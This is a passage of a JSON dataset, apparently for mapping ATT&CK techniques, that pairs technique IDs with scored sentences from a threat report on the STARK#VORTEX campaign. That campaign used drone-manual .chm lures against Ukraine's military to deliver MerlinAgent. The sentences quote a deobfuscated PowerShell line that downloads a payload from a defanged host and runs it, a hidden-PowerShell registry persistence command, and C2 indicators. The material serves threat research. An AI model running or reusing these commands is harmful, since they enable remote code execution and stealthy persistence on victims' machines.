“listen.serveminecraft[.]net” OR destinationhostname = “catbox[.]moe”) OR destinationaddress = “168.100.8[.]245”)) References:\n- New STARK#VORTEX Attack Campaign: Threat Actors Use Drone Manual Lures to Deliver MerlinAgent Payloads - Microsoft: .chm Help files - Github: Nishang script modified for Kautilya - Securonix Threat Research Knowledge Sharing Series: Hiding the PowerShell Execution Flow - MerlinAgent: новий open-source інструмент для здійснення кібератак у відношенні державних організацій України (CERT-UA#6995, CERT-UA#7183) - Documentation: Merlin Command and Control framework",
+  "ID_list": [
+    "T1027.010",
+    "T1059.001",
+    "T1059.007",
+    "T1105",
+    "T1112",
+    "T1204.002",
+    "T1218.001",
+    "T1219",
+    "T1547.001",
+    "T1562.001",
+    "T1573.001"
+  ],
+  "Name_list": [
+    "Command and Control",
+    "Encrypted Channel",
+    "Execution",
+    "Hidden Window",
+    "Masquerading",
+    "Persistence",
+    "PowerShell",
+    "Proxy",
+    "Source"
+  ],
+  "TTP_sentences": {
+    "T1027.010": [
+      {
+        "sentence": "By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov Sept.",
+        "score": 0.3481
+      },
+      {
+        "sentence": "25, 2023, updated Sept.",
+        "score": 0.3261
+      },
+      {
+        "sentence": "27, 2023, updated Oct.",
+        "score": 0.3555
+      },
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.5149
+      },
+      {
+        "sentence": "As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down.",
+        "score": 0.395
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.5107
+      },
+      {
+        "sentence": "Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military.",
+        "score": 0.4102
+      },
+      {
+        "sentence": "Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.",
+        "score": 0.3975
+      },
+      {
+        "sentence": "Last month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net).",
+        "score": 0.4189
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.4873
+      },
+      {
+        "sentence": "Attack chain overview The lure file presents itself as a Microsoft Help file, or .chm file.",
+        "score": 0.4325
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.4323
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.4828
+      },
+      {
+        "sentence": "Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.",
+        "score": 0.5263
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.7254
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.6894
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.382
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.7105
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.4013
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.5881
+      },
+      {
+        "sentence": "Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007.",
+        "score": 0.4362
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.4189
+      },
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.446
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.4058
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.4844
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.556
+      },
+      {
+        "sentence": "As we mentioned previously, the lure document was themed as a drone or UAV manual.",
+        "score": 0.4023
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.5477
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.6046
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.5531
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.5604
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.7791
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.7465
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.8308
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.7786
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.7019
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.5643
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.4404
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.6064
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.7531
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.5814
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.6476
+      },
+      {
+        "sentence": "The bulk of the code is stored inside the doS function which is called at the end of the script.",
+        "score": 0.5596
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.4552
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.6977
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.7188
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.5968
+      },
+      {
+        "sentence": "If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.",
+        "score": 0.5108
+      },
+      {
+        "sentence": "Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective.",
+        "score": 0.537
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.5331
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.6415
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.6599
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.56
+      },
+      {
+        "sentence": "The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier.",
+        "score": 0.5761
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.5494
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.5963
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.551
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.6127
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.41
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.4129
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.4766
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.4967
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.5437
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.315
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.4068
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.3515
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.3717
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.5835
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.5307
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.4529
+      },
+      {
+        "sentence": "However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .",
+        "score": 0.4339
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.3893
+      },
+      {
+        "sentence": "Command and control from the MerlinAgent payload to the attacker’s C2 server used an encrypted channel over port 443.",
+        "score": 0.4435
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.4488
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.4161
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.4081
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.4327
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.5849
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.4445
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.4931
+      },
+      {
+        "sentence": "The lure document has also been retargeted.",
+        "score": 0.4587
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.5531
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.606
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.55
+      },
+      {
+        "sentence": "When opened, the content of the lure file simply contains a few company logos.",
+        "score": 0.5383
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.8027
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.6671
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.6414
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.4772
+      },
+      {
+        "sentence": "Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game.",
+        "score": 0.4253
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.3668
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.4844
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.5064
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3288
+      }
+    ],
+    "T1059.007": [
+      {
+        "sentence": "By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov Sept.",
+        "score": 0.3572
+      },
+      {
+        "sentence": "25, 2023, updated Sept.",
+        "score": 0.3524
+      },
+      {
+        "sentence": "27, 2023, updated Oct.",
+        "score": 0.3671
+      },
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.4238
+      },
+      {
+        "sentence": "As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down.",
+        "score": 0.3753
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.4521
+      },
+      {
+        "sentence": "Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military.",
+        "score": 0.3737
+      },
+      {
+        "sentence": "Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.",
+        "score": 0.3365
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.4449
+      },
+      {
+        "sentence": "Attack chain overview The lure file presents itself as a Microsoft Help file, or .chm file.",
+        "score": 0.3835
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.4182
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.4686
+      },
+      {
+        "sentence": "Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.",
+        "score": 0.6221
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.5879
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.5044
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.3051
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.5237
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.3986
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.6271
+      },
+      {
+        "sentence": "Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007.",
+        "score": 0.4145
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.4719
+      },
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.448
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.3611
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.5567
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.4721
+      },
+      {
+        "sentence": "As we mentioned previously, the lure document was themed as a drone or UAV manual.",
+        "score": 0.3588
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.5418
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.6687
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.573
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.6346
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.6731
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.6413
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.6471
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.5294
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.5972
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.371
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.4096
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.5535
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.6683
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.4415
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.4817
+      },
+      {
+        "sentence": "The bulk of the code is stored inside the doS function which is called at the end of the script.",
+        "score": 0.5844
+      },
+      {
+        "sentence": "Next the script performs key functions: - Constructs the target path. - Checks if the executable file already exists at the defined path, returning -1 if it does. - Ensures that the necessary directory exists, creating it if needed. - Checks the success of directory creation, returning -2 if it fails.",
+        "score": 0.302
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.4038
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.5867
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.5628
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.4954
+      },
+      {
+        "sentence": "If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.",
+        "score": 0.3872
+      },
+      {
+        "sentence": "Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective.",
+        "score": 0.5842
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.4387
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.5116
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.4811
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.5656
+      },
+      {
+        "sentence": "The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier.",
+        "score": 0.5773
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.4086
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.4966
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.4573
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.5349
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.3261
+      },
+      {
+        "sentence": "The MerlinAgent framework is an open source C2 framework written in Go.",
+        "score": 0.3525
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.4094
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.3615
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.4013
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.3015
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.4564
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.3637
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.3274
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.5138
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.4307
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.4138
+      },
+      {
+        "sentence": "However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .",
+        "score": 0.3743
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.3102
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.3142
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.4009
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.3928
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.3348
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.4416
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.3818
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.3624
+      },
+      {
+        "sentence": "The lure document has also been retargeted.",
+        "score": 0.4313
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.4927
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.6654
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.5785
+      },
+      {
+        "sentence": "When opened, the content of the lure file simply contains a few company logos.",
+        "score": 0.4343
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.6982
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.6285
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.5107
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.4091
+      },
+      {
+        "sentence": "Why the attackers chose to masquerade as Minecraft is unclear, other than the fact that it is a wildly popular game.",
+        "score": 0.3281
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.4228
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.4908
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.4656
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3185
+      }
+    ],
+    "T1219": [
+      {
+        "sentence": "By Securonix Threat Research: D.Iuzvyk, T.Peck, O.Kolesnikov Sept.",
+        "score": 0.329
+      },
+      {
+        "sentence": "25, 2023, updated Sept.",
+        "score": 0.3076
+      },
+      {
